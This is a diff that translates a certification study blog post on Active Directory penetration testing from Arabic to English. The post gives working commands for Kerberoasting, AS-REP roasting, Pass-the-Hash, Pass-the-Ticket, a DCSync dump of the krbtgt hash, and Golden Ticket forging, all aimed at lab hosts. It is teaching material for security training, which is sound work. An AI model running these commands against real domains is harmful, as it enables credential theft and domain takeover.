@@ -1,12 +1,12 @@
 ---
-title: "eCPPT Deep-Dive: Part 4 - Active Directory Penetration Testing: Kerberos, Domain Attacks & Persistence"
+title: "eCPPT Deep-Dive: Part 4 - Active Directory Pentesting: Kerberos, Domain Attacks & Persistence"
 date: 2026-11-12 11:00:00 +0300
 categories: [Cyber Security, Penetration Testing]
 tags: [ecppt, active-directory, kerberos, kerberoasting, as-rep-roasting, bloodhound, pass-the-hash, golden-ticket]
-description: "الدليل الشامل للجزء الرابع من مسار eCPPT: تشريح بروتوكول Kerberos، استكشاف النطاق عبر BloodHound و PowerView، هجمات Kerberoasting و AS-REP Roasting، تكتيكات Pass-the-Hash وتثبيت الاستمرارية عبر Golden و Silver Tickets."
+description: "An exhaustive technical breakdown of Part 4 of the eCPPT curriculum: Active Directory architecture, Kerberos protocol mechanics, BloodHound graph analysis, Kerberoasting, AS-REP Roasting, Pass-the-Hash, and Golden/Silver ticket persistence."
 image:
   path: /assets/images/posts/ecppt/part-4-cover.png
-  alt: "eCPPT Masterclass Part 4 - Active Directory Penetration Testing: Kerberos, Domain Attacks & Persistence"
+  alt: "eCPPT Masterclass Part 4 - Active Directory Pentesting: Kerberos, Domain Attacks & Persistence"
 series: "eCPPTv3 Certified Professional Penetration Tester"
 toc: true
 schema:
@@ -14,230 +14,231 @@ schema:
   author: Abdulrahman M. Fathi
 ---
 
-يعد الدليل النشط (**Active Directory - AD**) البيئة الإدارية المركزية لأكثر من 90% من كبرى الشركات والمؤسسات حول العالم. ولذلك، تخصص شهادة **eCPPT** حيزًا جوهريًا لاختبار اختراق نطاقات ويندوز، والتحرك داخل بيئات المؤسسات من مجرد موطئ قدم أولي (Initial Foothold) حتى السيطرة المطلقة على النطاق كـ **Domain Admin**.
+Active Directory (AD) is the central identity and access management architecture utilized by over 90% of Fortune 500 enterprises. Consequently, the **eCPPT (eLearnSecurity Certified Professional Penetration Tester)** curriculum places significant emphasis on assessing Windows domain environments—transitioning from an initial domain foothold to full **Domain Admin** escalation and establishing persistent control.
 
-في هذا الدليل الهندسي المعمق، سنشرح بالتفصيل كيفية تشريح بروتوكول **Kerberos**، واستخدام أدوات التحليل الرسومي مثل **BloodHound**، وتنفيذ الهجمات المتقدمة على التذاكر والهاشات، وتثبيت التواجد المستمر (Persistence) داخل شبكة الدليل النشط.
+In this deep dive, we break down Active Directory architecture, analyze the internal workings of the **Kerberos** authentication protocol, evaluate domain relationships via **BloodHound**, execute ticket-based attacks (**Kerberoasting** and **AS-REP Roasting**), and establish domain persistence using **Golden and Silver Tickets**.
 
 ---
 
-### جدول التنقل في السلسلة (Series Navigation)
+### Series Navigation
 
-| **المقال السابق** | **المقال الحالي** | **المقال القادم** |
+| **Previous Part** | **Current Part** | **Next Part** |
 | :---: | :---: | :---: |
-| [الجزء 3: اختبار اختراق الشبكات وهجمات MITM](/posts/ecppt-v3-part-3-network-penetration-testing/) | **الجزء 4: اختبار اختراق الدليل النشط (Active Directory)** | [الجزء 5: دليل تصعيد الصلاحيات (Privilege Escalation)](/posts/ecppt-v3-part-5-privilege-escalation-playbook/) |
+| [Part 3: Network Penetration Testing & MITM](/posts/ecppt-v3-part-3-network-penetration-testing/) | **Part 4: Active Directory Pentesting & Kerberos** | [Part 5: Windows & Linux Privilege Escalation](/posts/ecppt-v3-part-5-privilege-escalation-playbook/) |
 
 ---
 
-## أبرز النقاط الرئيسية (Key Takeaways)
+## Key Takeaways
 
-* **بنية بروتوكول كيربيروس (Kerberos Internals)**: يعتمد النظام على مصادقة التذاكر الصادرة من مركز توزيع المفاتيح (KDC) عبر ثلاث مراحل: تذكرة منح التذاكر (TGT) الصادرة من خدمة المصادقة (AS)، وتذكرة الخدمة (TGS) الصادرة من خادم منح التذاكر، ثم إرسالها إلى الخدمة النهائية.
-* **استهداف حسابات الخدمات (Kerberoasting)**: أي مستخدم عادي داخل النطاق يمكنه قانونيًا طلب تذكرة TGS لأي حساب خدمة يمتلك اسم مدير الخدمة (SPN). وبما أن جزءًا من هذه التذكرة مشفر بكلمة مرور حساب الخدمة، يمكن استخراجه وكسره أوفلاين دون تنبيه أنظمة الدفاع.
-* **هجوم AS-REP Roasting**: يستهدف الحسابات التي تم تعطيل متطلب المصادقة الأولية لها (`Do not require Kerberos preauthentication`)؛ حيث يمكن طلب تذكرة مباشرة من الـ KDC دون تقديم كلمة مرور، ثم كسر الهاش المشفر محليًا.
-* **إعادة تدوير الهويات (Pass-the-Hash & Pass-the-Ticket)**: لا يشترط كسر كلمة المرور إلى نص صريح؛ فيمكن إعادة استخدام هاشات NTLM مباشرة للتحكم في الأجهزة البعيدة، أو حقن تذاكر كيربيروس (`.kirbi` / `.ccache`) في ذاكرة الجلسة.
-* **الاستمرارية المطلقة (Golden & Silver Tickets)**: السيطرة على هاش حساب `krbtgt` تمنح المهاجم القدرة على صياغة تذاكر TGT وهمية تمنحه صلاحيات غير محدودة لا تسقط بتغيير كلمات مرور المستخدمين، بينما تستهدف Silver Tickets تزوير تذاكر خدمات محددة بصمت تام بعيدًا عن الـ DC.
-
----
-
-## 1. البنية المعمارية للدليل النشط (Active Directory Architecture)
-
-يجمع الدليل النشط الكائنات (Objects) مثل المستخدمين، أجهزة الحاسوب، المجموعات، وسياسات المجموعة (GPOs) في تسلسل هرمي منظم:
-
-* **الغابة (Forest)**: أعلى مستوى أمني وتجميعي؛ تشترك كافة النطاقات بداخلها في مخطط موحد (Schema) وفهرس عمومي (Global Catalog).
-* **النطاق (Domain)**: وحدة إدارية منطقية تتشارك قاعدة بيانات أمنية واحدة يديرها خادم أو أكثر يُعرف بمتحكم النطاق (**Domain Controller - DC**).
-* **الوحدات التنظيمية (OUs)**: حاويات فرعية داخل النطاق لتنظيم الكائنات وتطبيق سياسات المجموعة (GPOs) عليها.
-* **علاقات الثقة (Trust Relationships)**: روابط تربط النطاقات ببعضها للسماح للمستخدمين بالوصول إلى موارد خارج نطاقهم المحلي (One-way, Two-way, Transitive Trusts).
+* **Kerberos 5-Step Protocol Architecture**: Authentication is orchestrated by the Key Distribution Center (KDC) via two sub-services: the Authentication Service (AS), which issues Ticket Granting Tickets (TGTs), and the Ticket Granting Service (TGS), which issues service-specific session tickets.
+* **Kerberoasting Service Accounts**: Any authenticated domain user can legally request a TGS ticket for any account configured with a Service Principal Name (SPN). Because portions of the TGS ticket are encrypted with the target service account's NTLM password hash, the ticket can be extracted from memory and cracked offline without triggering account lockout policies.
+* **AS-REP Roasting**: Accounts configured with the `DONT_REQ_PREAUTH` flag allow an unauthenticated attacker to request an AS-REP ticket without supplying a password. The returned encrypted timestamp can be cracked offline with Hashcat.
+* **Credential Replay Attacks**: Cleartext passwords are rarely required in Active Directory. Attackers can leverage **Pass-the-Hash (PtH)** to execute remote commands using NTLM hashes, or use **Pass-the-Ticket (PtT)** to inject harvested `.kirbi` tickets directly into memory.
+* **Enterprise Persistence**: Compromising the `krbtgt` account hash enables attackers to forge **Golden Tickets** (forged TGTs granting arbitrary group memberships across the domain). Conversely, **Silver Tickets** forge TGS tickets for specific services without ever communicating with the Domain Controller.
 
 ---
 
-## 2. تعداد النطاق واكتشاف مسارات الهجوم (Enumeration & Graph Analysis)
+## 1. Active Directory Architecture Overview
 
-### استخدام سكربت PowerView للاستكشاف اليدوي:
+Active Directory organizes enterprise resources into a hierarchical logical structure:
+
+* **Forest**: The top-level security and administrative boundary; all domains within a forest share a single schema and Global Catalog.
+* **Domain**: A logical security boundary sharing a unified database managed by one or more **Domain Controllers (DCs)**.
+* **Organizational Units (OUs)**: Sub-containers within domains used to group user accounts, security groups, and computer objects, allowing granular Group Policy Objects (GPOs) to be applied.
+* **Trust Relationships**: Architectural links allowing users from one domain to access resources in another (one-way, two-way, transitive, external, or forest trusts).
+
+---
+
+## 2. Domain Enumeration & Attack Path Analysis
+
+### Manual Auditing via PowerView:
 
 ```powershell
-# استيراد سكريبت PowerView
+# Import the PowerView offensive automation script
 Import-Module .\PowerView.ps1
 
-# استعراض معلومات النطاق والسياسات العامة
+# Retrieve core domain metadata and password policy parameters
 Get-Domain
 Get-DomainPolicy
 
-# تعداد مستخدمي النطاق والبحث عن الحسابات الحساسة
+# Enumerate active domain accounts with sensitive descriptions
 Get-DomainUser -Properties samaccountname,description | Out-GridView
 
-# استخراج أعضاء مجموعة مدراء النطاق (Domain Admins)
+# List all members of the high-privilege Domain Admins security group
 Get-DomainGroupMember -Identity "Domain Admins"
 
-# البحث عن حسابات تمتلك حقوق مدير محلي على أجهزة أخرى
+# Discover workstations where the current user holds local administrative rights
 Find-LocalAdminAccess
 ```
 
-### التحليل الرسومي المتقدم عبر BloodHound & SharpHound:
+### Graph Theory Attack Path Analysis with BloodHound:
 
-يعد **BloodHound** الأداة الثورية في بيئات Active Directory؛ إذ تحول علاقات الصلاحيات المعقدة وصلاحيات الـ ACLs المخفية إلى رسم بياني (Graph Analysis) يكشف أقصر طريق للوصول إلى الـ Domain Admin:
+**BloodHound** ingests domain relationships and uses graph theory (via Neo4j) to map indirect permission abuse chains leading to Domain Admin compromise:
 
 ```mermaid
 flowchart LR
-    Compromised["مستخدم أولي مخترق<br/>(Standard User)"]
-    LocalGroup["مجموعة HelpDesk<br/>(Local Admin على مبيعات)"]
-    Workstation["محطة عمل SALES-PC<br/>(جلسة مفتوحة لـ Admin)"]
-    DomainAdmin["خادم متحكم النطاق<br/>(Domain Admin)"]
+    Compromised["Compromised Standard User<br/>(Initial Foothold)"]
+    LocalGroup["HelpDesk Security Group<br/>(Local Admin on SALES-PC)"]
+    Workstation["SALES-PC Workstation<br/>(Active Domain Admin Session)"]
+    DomainAdmin["Domain Controller (DC01)<br/>(Full Enterprise Admin Control)"]
     
-    Compromised -- "عضو في" --> LocalGroup
-    LocalGroup -- "امتلاك Admin على" --> Workstation
-    Workstation -- "سرقة رمز الدخول (Token) لـ" --> DomainAdmin
+    Compromised -- "MemberOf" --> LocalGroup
+    LocalGroup -- "AdminTo" --> Workstation
+    Workstation -- "Steal Memory Token / LSASS of" --> DomainAdmin
 ```
 
 ```powershell
-# جمع كافة بيانات النطاق عبر SharpHound بصيغة مضغوطة
+# Ingest comprehensive Active Directory relationship data using SharpHound
 Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\Temp -ZipFileName ad_loot.zip
 ```
 
-نقوم بنقل الملف الناتج واستيراده إلى واجهة BloodHound GUI والبحث عبر استعلامات Cypher سابقة التجهيز مثل:
+Once imported into the BloodHound GUI, we execute pre-built Cypher graph queries such as:
 * `Find Shortest Paths to Domain Admins`
 * `Find Shortest Paths from Kerberoastable Users`
-* `Find Workstations where Domain Users have Local Admin`
+* `Shortest Paths to High Value Targets`
 
 ---
 
-## 3. تشريح بروتوكول كيربيروس وهجمات التذاكر (Kerberos Deep-Dive)
+## 3. Kerberos Protocol Mechanics Deconstructed
 
-يعتمد بروتوكول Kerberos على تشفير متناظر ومصادقة متبادلة لحماية هويات المستخدمين:
+Kerberos relies on symmetric cryptography and mutual authentication:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor User as المستخدم / المهاجم
-    participant KDC as متحكم النطاق (KDC: AS / TGS)
-    participant Service as خادم الخدمة (SQL / SMB / CIFS)
+    actor User as Domain User / Attacker
+    participant KDC as Domain Controller (KDC: AS & TGS)
+    participant Service as Target Service Server (MSSQL / CIFS)
     
-    Note over User,KDC: المرحلة 1: طلب تذكرة منح التذاكر (TGT)
-    User->>KDC: 1. AS-REQ: طلب موثق بتشفير الطابع الزمني بكلمة مرور المستخدم
-    alt إذا كان الحساب غير مفعل به Pre-Auth (AS-REP Roasting!)
-        Note over KDC: KDC يرسل AS-REP مشفر بكلمة المرور دون طلب إثبات مسبق!
+    Note over User,KDC: Phase 1: Authentication Service Exchange
+    User->>KDC: 1. AS-REQ: Encrypted timestamp with user password hash
+    alt Target has Pre-Authentication Disabled (AS-REP Roasting!)
+        Note over KDC: KDC returns AS-REP without requiring password pre-authentication!
     end
-    KDC->>User: 2. AS-REP: إرسال تذكرة TGT (مشفرة بكلمة مرور حساب krbtgt)
+    KDC->>User: 2. AS-REP: Returns Ticket Granting Ticket (TGT - encrypted with krbtgt hash)
     
-    Note over User,KDC: المرحلة 2: طلب تذكرة الخدمة (TGS)
-    User->>KDC: 3. TGS-REQ: تقديم تذكرة TGT + طلب الوصول للخدمة (SPN)
-    KDC->>User: 4. TGS-REP: إرسال تذكرة TGS (مشفرة بكلمة مرور حساب الخدمة!)
-    Note over User: هجوم Kerberoasting! استخراج تذكرة TGS المشفرة وكسرها أوفلاين
+    Note over User,KDC: Phase 2: Ticket Granting Service Exchange
+    User->>KDC: 3. TGS-REQ: Supplies TGT + Requests access to target SPN
+    KDC->>User: 4. TGS-REP: Returns TGS Ticket (Encrypted with Target Service Account Hash!)
+    Note over User: Kerberoasting Attack Vector! Extract TGS and crack offline
     
-    Note over User,Service: المرحلة 3: تقديم التذكرة للخدمة
-    User->>Service: 5. AP-REQ: تقديم تذكرة TGS لإثبات الهوية وبدء الجلسة
+    Note over User,Service: Phase 3: Client/Server Application Exchange
+    User->>Service: 5. AP-REQ: Supplies TGS ticket to authenticate and establish session
 ```
 
 ---
 
-## 4. تنفيذ الهجمات المتقدمة على كيربيروس (Executing Kerberos Attacks)
+## 4. Executing Modern Kerberos Attacks
 
-### 1. هجوم Kerberoasting
+### 1. Kerberoasting
 
-نبحث عن الحسابات التي تمتلك قيمة `servicePrincipalName` مسجلة، ونطلب تذاكر TGS لها ثم نحفظها بصيغة يقبلها كاسر الهاشات **Hashcat**:
+We enumerate service accounts possessing registered **Service Principal Names (SPNs)**, request a TGS ticket, and output it in Hashcat-compatible format:
 
 ```powershell
-# استخراج التذاكر عبر أداة Rubeus داخل بيئة ويندوز
+# Extract Kerberos TGS tickets inside Windows using Rubeus
 .\Rubeus.exe kerberoast /outfile:kerb_hashes.txt /format:hashcat
 
-# أو عبر جهاز كالي لينكس باستخدام Impacket GetUserSPNs
+# Or perform remotely from Kali Linux via Impacket's GetUserSPNs
 GetUserSPNs.py inlanefreight.local/forend:Password123 -dc-ip 10.10.10.50 -request -outputfile kerb_hashes.txt
 ```
 
 ```bash
-# كسر الهاش محليًا باستخدام Hashcat (Mode 13100 لـ Kerberos 5 TGS-REP etype 23)
+# Crack the extracted TGS ticket offline using Hashcat (Mode 13100: Kerberos 5 TGS-REP etype 23)
 hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -O
 ```
 
 ---
 
-### 2. هجوم AS-REP Roasting
+### 2. AS-REP Roasting
 
-نستعلم عن الحسابات التي تملك خاصية `DONT_REQ_PREAUTH` مفعلة (أي لا تتطلب مصادقة أولية لتزويدها بـ AS-REP):
+Targeting accounts that have the `Do not require Kerberos preauthentication` flag (`DONT_REQ_PREAUTH`) enabled:
 
 ```bash
-# استخراج الهاشات لحسابات Pre-Auth Disabled عبر Impacket
+# Query the domain for Pre-Auth Disabled accounts and request AS-REP responses
 GetNPUsers.py inlanefreight.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.50
 ```
 
 ```bash
-# كسر الهاش عبر Hashcat (Mode 18200 لـ Kerberos 5 AS-REP etype 23)
+# Crack the AS-REP ciphertext offline using Hashcat (Mode 18200: Kerberos 5 AS-REP etype 23)
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O
 ```
 
 ---
 
-## 5. تقنيات الحركة الجانبية (Lateral Movement via Credential Replay)
+## 5. Lateral Movement & Credential Replay
 
-### 1. هجوم تمرير الهاش (Pass-the-Hash - PtH)
-إذا حصلنا على هاش NTLM لمستخدم يمتلك صلاحيات مدير محلي أو مدير نطاق، لا نحتاج إلى معرفة كلمة المرور النصية إطلاقًا:
+### 1. Pass-the-Hash (PtH)
+If an NTLM hash of an administrative account is captured from memory (via Mimikatz or LSASS dumping), it can be used directly for lateral movement without cracking:
 
 ```bash
-# تنفيذ أوامر تفاعلية عبر Impacket wmiexec
+# Semi-interactive administrative command execution via Impacket wmiexec
 wmiexec.py -hashes :7fc07bbe74664a7726da442b439aa4b5 Administrator@10.10.10.60
 
-# تنفيذ هجوم متعدد الأهداف وفحص الأجهزة عبر CrackMapExec
+# Subnet-wide credential validation and execution using CrackMapExec
 crackmapexec smb 10.10.10.0/24 -u Administrator -H 7fc07bbe74664a7726da442b439aa4b5 --exec-method smbexec -x "whoami"
 ```
 
-### 2. هجوم تمرير التذكرة (Pass-the-Ticket - PtT)
-إذا حصلنا على تذكرة كيربيروس بصيغة `.kirbi` من الذاكرة أو عبر Rubeus، يمكننا حقنها مباشرة في جلسة المستخدم الحالية:
+### 2. Pass-the-Ticket (PtT)
+Injecting harvested Kerberos tickets (`.kirbi` on Windows or `.ccache` on Linux) directly into the current logon session:
 
 ```powershell
-# استخراج تذاكر الجلسات النشطة من الذاكرة عبر Rubeus
+# Extract active Kerberos tickets from memory using Rubeus
 .\Rubeus.exe dump
 
-# حقن التذكرة المستخرجة في الجلسة الحالية
+# Inject the extracted ticket into the current session context
 .\Rubeus.exe ptt /ticket:doIEwjCCBL6gAwIBBaEDAgEWooIE...kirbi
 
-# التحقق من وجود التذكرة بالذاكرة (ستظهر التذكرة وتسمح بالوصول الفوري للموارد)
+# Verify ticket presence in memory and access restricted domain shares
 klist
 dir \\DC01.inlanefreight.local\c$
 ```
 
 ---
 
-## 6. تقنيات تثبيت التواجد المستمر (Domain Persistence)
+## 6. Enterprise Persistence Mechanisms
 
-### 1. هجوم DCSync
-يستغل المهاجم الصلاحيات الإدارية الممنوحة لمزامنة متحكمات النطاق (`DS-Replication-Get-Changes-All`) لمحاكاة سلوك متحكم نطاق حقيقي، ومطالبة الـ DC الأصلي بتفريغ كافة هاشات النطاق بما فيها حسابات المدراء وحساب `krbtgt` الحرج:
+### 1. The DCSync Attack
+By leveraging the Directory Replication Service (DRS) Remote Protocol APIs (`DS-Replication-Get-Changes-All`), an attacker with administrative delegation rights can impersonate a Domain Controller and request password hashes for any account directly from the primary DC:
 
 ```bash
-# تفريغ هاشات النطاق بالكامل دون تشغيل أي كود على سيرفر الـ DC نفسه!
+# Extract the NTLM hash of the krbtgt account without running code on the DC itself!
 secretsdump.py inlanefreight.local/da_user:SuperPass123@10.10.10.50 -just-dc-user krbtgt
 ```
 
-### 2. التذكرة الذهبية (Golden Ticket)
-باستخدام هاش حساب `krbtgt` ومُعرف أمان النطاق (Domain SID)، يقوم المهاجم بصياغة تذكرة TGT وهمية وصالحة لمدة 10 سنوات، تمكنه من تجسيد أي مستخدم يريده والدخول كـ Domain Admin أو Enterprise Admin في أي وقت:
-
-```powershell
-# صياغة وحقن التذكرة الذهبية عبر Mimikatz
-mimikatz # kerberos::golden /user:Administrator /domain:inlanefreight.local /sid:S-1-5-21-1337-4242-9999 /krbtgt:b2a59a3... /id:500 /ptt
-```
+### 2. Golden Tickets vs. Silver Tickets
 
 ```mermaid
 flowchart TD
-    subgraph GoldenTicket ["التذكرة الذهبية (Golden Ticket)"]
-        G1["استهداف: حساب krbtgt"]
-        G2["التزوير: تذكرة منح التذاكر (TGT)"]
-        G3["النطاق: سيطرة كاملة على الغابة بأكملها"]
-        G4["الظهور: لا تمر بـ KDC عند التزوير ولكن تترك بصمات تذاكر غير طبيعية"]
+    subgraph GoldenTicket ["Golden Ticket (Forged TGT)"]
+        G1["Target Key: krbtgt NTLM Password Hash"]
+        G2["Forged Artifact: Ticket Granting Ticket (TGT)"]
+        G3["Scope: Absolute control across the entire Forest"]
+        G4["Validity: Configurable (typically valid for 10 years)"]
+        G5["Detection Risk: Leaves anomalous ticket signatures in KDC logs"]
     end
     
-    subgraph SilverTicket ["التذكرة الفضية (Silver Ticket)"]
-        S1["استهداف: هاش حساب خدمة محددة (مثل CIFS أو MSSQL)"]
-        S2["التزوير: تذكرة خدمة (TGS)"]
-        S3["النطاق: مقتصر على الخدمة والهدف المحدد فقط"]
-        S4["التخفي: فائق التخفي - لا تتصل بالـ DC إطلاقًا!"]
+    subgraph SilverTicket ["Silver Ticket (Forged TGS)"]
+        S1["Target Key: Specific Service Account NTLM Hash (e.g. CIFS, MSSQL)"]
+        S2["Forged Artifact: Service Ticket (TGS)"]
+        S3["Scope: Restricted strictly to the targeted service"]
+        S4["Stealth: Ultra-stealthy; never contacts the DC!"]
     end
+```
+
+#### Forging and Injecting a Golden Ticket via Mimikatz:
+
+```powershell
+mimikatz # kerberos::golden /user:Administrator /domain:inlanefreight.local /sid:S-1-5-21-1337-4242-9999 /krbtgt:b2a59a3... /id:500 /ptt
 ```
 
 ---
 
-## المراجع والمصادر الخارجية (References & Further Reading)
+## References & Further Reading
 
-1. **Microsoft MS-KILE: Kerberos Protocol Extensions**: التوثيق المعماري الرسمي لبروتوكول كيربيروس من مايكروسوفت.
-2. **SpecterOps BloodHound Documentation**: [https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)
-3. **Rubeus: An Active Directory & Kerberos Toolset by HarmJ0y**: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
-4. **Benjamin Delpy's Mimikatz Wiki**: [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki)
+1. **Microsoft MS-KILE: Kerberos Protocol Extensions Specification**: [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/)
+2. **BloodHound Documentation**: [https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)
+3. **Rubeus: An Active Directory & Kerberos Toolset** by HarmJ0y: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+4. **Benjamin Delpy's Mimikatz Repository**: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
 5. **MITRE ATT&CK Matrix for Enterprise**:
    * Technique T1558: Steal or Forge Kerberos Tickets (Kerberoasting, AS-REP Roasting, Golden/Silver Tickets)
    * Technique T1003.006: OS Credential Dumping: DCSync
